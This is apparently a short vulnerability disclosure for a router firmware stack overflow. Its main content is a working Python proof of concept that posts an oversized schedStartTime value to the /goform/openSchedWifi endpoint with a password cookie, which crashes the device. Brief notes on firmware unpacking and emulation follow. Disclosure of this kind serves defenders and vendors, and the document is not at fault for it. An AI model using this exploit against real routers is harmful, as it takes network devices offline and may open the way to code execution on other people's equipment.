
POC：
```
from pwn import *
import requests

payload = b'a'*176

url = "http://192.168.100.254/goform/openSchedWifi"

cookie = {"Cookie":"password=12345"}
data = {"schedStartTime": b"\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```

1. The firmware is unpacked, the file system is separated, and the file is analyzed

2. There is a stack overflow vulnerability function

<img width="284" height="237" alt="image" src="https://github.com/user-attachments/assets/6d949f21-8b07-4904-bbcc-f7af9d89957c" />


3. Firmware emulation simulation attack
POC causes router crashes

<img width="413" height="69" alt="image" src="https://github.com/user-attachments/assets/515ad410-a691-4f95-8c39-23ab621d9a7e" />
